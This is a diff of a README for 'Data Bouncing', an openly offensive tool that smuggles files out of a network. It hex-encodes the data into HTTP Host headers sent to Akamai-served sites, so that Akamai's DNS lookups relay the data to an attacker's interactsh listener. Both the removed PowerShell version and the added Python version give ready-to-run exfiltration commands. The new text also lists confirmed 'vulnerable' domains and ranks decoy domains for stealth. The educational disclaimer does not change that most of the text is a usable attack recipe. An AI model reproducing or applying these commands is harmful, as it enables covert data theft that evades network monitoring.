@@ -1,83 +1,130 @@
-# Data Bouncing - PowerShell Version
+# Data Bouncing
 
-<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/dataBouncing.png" width="1000" alt="DataBounce banner">
+Exfiltrate data through DNS queries that originate from Akamai's CDN infrastructure — not your machine.
 
-## Overview
-Data Bouncing is a technique for transmitting data between two endpoints using DNS lookups and HTTP header manipulation. This PowerShell version packs all the core functionality of data bouncing into a simple tool for reconnaissance, data exfiltration, and file reassembly. It's built on the original, off-the-wall ideas of our hacker pals, John and Dave. Their wild, creative approach to data bouncing sparked everything we've built, and we're forever grateful. If you're curious, check out their work over at [thecontractor.io](https://thecontractor.io/data-bouncing/). Huge props to them for always pushing the envelope and keeping the hacker spirit alive!
+## How It Works
 
-## Components
+1. You send an HTTP request to an Akamai-backed domain (e.g. `adobe.com`) on **port 80**
+2. The `Host` header contains a crafted domain with your data encoded as hex subdomains
+3. Akamai's edge server resolves the Host header to route the request
+4. That DNS query hits **your** controlled DNS server — from **Akamai's IP**, not yours
+5. The target site returns an error, but the data already bounced through DNS
 
-<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/dbheroes.png" width="1000" alt="DataBounce banner">
-
-The project comes with two main scripts:
-- **`nightCrawler.ps1`**: Handles data exfiltration.
-- **`deadPool.ps1`**: Reassembles the exfiltrated data from DNS logs.
-
-### `nightCrawler.ps1`
-This script splits a file into hex-encoded chunks, numbers them in sequence, and sends each chunk as part of a DNS query domain in an HTTP header. In the latest version, you can supply multiple URLs—separated by commas—so the chunks are distributed across different endpoints, making it way harder for any one site to collect all of them.
-
-For example, each DNS query’s domain is built like this:
-  
-Identifier.Sequence.HexChunk.Domain
-
-A sample domain might look like:
-
-**testid.001.A1B2C3D4E5...cv7t25l2fbss73eo9uhg41jqimr9ui9ti.oast.me**
-
-The script randomly selects one URL from the list you supply (e.g., `"adobe.com, github.com"`) for each chunk.
-
-### `deadPool.ps1`
-This script reads your DNS logs, extracts the hex-encoded chunks (with their sequence numbers) from each DNS query, groups duplicate entries, sorts the chunks by sequence number, decodes each chunk individually, and concatenates them to reconstruct the original file. If AES encryption was enabled during exfiltration, it will also decrypt the data using your provided key.
-
-## Usage
-
-### Prerequisites
-- A controlled DNS server.
-- For hobbyists, [InteractSh](https://github.com/projectdiscovery/interactsh) is a solid choice.
-
-### Setting Up
-
-1. **Listener Setup**:  
-   Use [InteractSh Web Client](https://app.interactsh.com/#/) or the [Build Script](https://github.com/Unit-259/dataBouncing/blob/main/Resources/interactshBuild.sh) on Ubuntu 22.04.  
-
-<img src="https://github.com/Unit-259/DataBouncing/blob/main/Resources/interactShBuild.gif" width="600" alt="InteractSh Build Script GIF">
-
-## Target Machine Preparation:
-
-Get your data ready. Run the updated nightCrawler.ps1 script on the target machine. The updated script allows you to specify one or more URLs (as a comma-separated list) for sending out the data.
-Running the Scripts
-
-## Data Exfiltration with nightCrawler.ps1:
-
-Provide the URLs for your OOB listener as a comma-separated list (e.g., adobe.com, github.com).
-
-Specify the file path of the data you wish to exfiltrate.
-
-```powershell
-Invoke-NightCrawler -Identifier "testid" -Domain "cv8erb8gdmbc73c0ns00o1dra4c8ibd4r.oast.fun" -Urls "adobe.com","github.com" -FilePath "C:\Path\to\file.txt" -EncryptionEnabled -EncryptionKey "YourSecretKey"
+```
+Your Machine ──HTTP──> adobe.com (Akamai Edge)
+                           │
+                           ├──DNS──> your-payload.your-oast-domain.oast.me
+                           │              │
+                           │              └──> Your DNS Listener (interactsh)
+                           │
+                           └──HTTP 4xx──> Your Machine (don't care)
 ```
 
-You also have the option of using our GUI, which now supports comma-separated URLs. Just run the following command after loading in **Invoke-NightCrawler**
+Your machine only talks to `adobe.com`. The DNS exfiltration query comes from Akamai.
 
-```powershell
-Invoke-NightCrawlerGui
+## Quick Start
+
+```bash
+# Install
+pip install requests cryptography
+
+# Terminal 1 — start listener
+python bounce.py listen
+
+# Terminal 2 — copy the .oast domain, then send a file
+python bounce.py send -d "YOUR_DOMAIN.oast.me" -u adobe.com -f secret.txt -i mysession
+
+# Terminal 2 — decode
+python bounce.py decode -l interactsh.log
 ```
 
-## Data Reconstruction with deadPool.ps1:
+## Commands
 
-Run this script on your own computer where the DNS logs are stored.
-It extracts the hex-encoded chunks (with sequence numbers), sorts them, decodes them, and reconstructs the original file.
-Example command:
+### `send` — Exfiltrate a file
 
-```powershell
-Invoke-DeadPool -LogFile "C:\Path\to\logs.txt" -Identifier "testid" -EncryptionEnabled -EncryptionKey "YourSecretKey" -OutputFile "C:\Path\to\ReconstructedFile.txt"
+```bash
+# Single bounce domain
+python bounce.py send -d "OAST_DOMAIN" -u adobe.com -f file.txt -i session1
+
+# Multiple bounce domains (distributes chunks)
+python bounce.py send -d "OAST_DOMAIN" -u adobe.com intuit.com avast.com -f file.txt -i session1
+
+# From a file of domains
+python bounce.py send -d "OAST_DOMAIN" -F domains.txt -f file.txt -i session1
+
+# With AES encryption
+python bounce.py send -d "OAST_DOMAIN" -u adobe.com -f file.txt -i session1 -k "MySecretKey"
 ```
 
-## Notes:
+### `decode` — Reconstruct from DNS logs
 
-Replace placeholders such as your-domain.oast.me and URL values with actual values from your environment.
-The scripts are provided as a proof-of-concept (PoC) and should be used responsibly.
+```bash
+# Auto-detect all sessions, write to ./output/
+python bounce.py decode -l interactsh.log
+
+# Specific session
+python bounce.py decode -l interactsh.log -i session1
+
+# With decryption
+python bounce.py decode -l interactsh.log -k "MySecretKey"
+```
+
+### `scan` — Test which domains bounce
+
+```bash
+# Test domains from file
+python bounce.py scan -d "OAST_DOMAIN" -F domains.txt -m raw
+
+# Test specific domains
+python bounce.py scan -d "OAST_DOMAIN" -u adobe.com intuit.com -m raw
+```
+
+### `listen` — Start interactsh and log to file
+
+```bash
+python bounce.py listen                    # logs to interactsh.log
+python bounce.py listen -o mylog.txt       # custom log file
+```
+
+## Vulnerable Domains
+
+See [`vulnerable_domains.txt`](vulnerable_domains.txt) for the full list of **117 confirmed domains** that bounce DNS queries through Akamai's infrastructure.
+
+Top picks for stealth:
+
+| Domain | Why |
+|---|---|
+| `adobe.com` | Creative Cloud phones home on every workstation |
+| `intuit.com` | QuickBooks traffic expected in any business |
+| `avast.com` | Looks like antivirus updates |
+| `www.norton.com` | Looks like antivirus updates |
+| `www.microsoft.com` | Expected everywhere |
+| `www.eset.com` | Looks like antivirus updates |
+
+## The Vulnerability
+
+This is an **Akamai infrastructure-level issue**. When Akamai's edge servers receive an HTTP request on port 80 with an unrecognized Host header, they perform a DNS lookup on the Host header value to determine routing. This DNS query originates from Akamai's edge IPs, effectively proxying the DNS resolution.
+
+- **Affected**: Akamai-served domains on port 80 (raw HTTP)
+- **Not affected**: Cloudflare, Fastly, AWS CloudFront, Azure Front Door
+- **Impact**: Data exfiltration where DNS queries are attributed to Akamai, not the attacker
+- **Detection difficulty**: Network logs show only HTTP traffic to legitimate domains
+
+## Prerequisites
+
+- Python 3.10+
+- [interactsh-client](https://github.com/projectdiscovery/interactsh) for DNS capture
+- `pip install requests cryptography`
+
+```bash
+# Install interactsh
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+```
+
+## Credits
+
+Built on the original data bouncing research by John and Dave at [thecontractor.io](https://thecontractor.io/data-bouncing/). Original PowerShell implementation by [Unit-259](https://github.com/Unit-259). Python rewrite and Akamai vulnerability research by [@chukfinley](https://github.com/chukfinley).
 
 ## Disclaimer
 
-This project is for educational purposes only. Use it responsibly and ensure you comply with all applicable laws and regulations.
+This project is for educational and authorized security testing purposes only. Use responsibly and ensure you comply with all applicable laws and regulations.
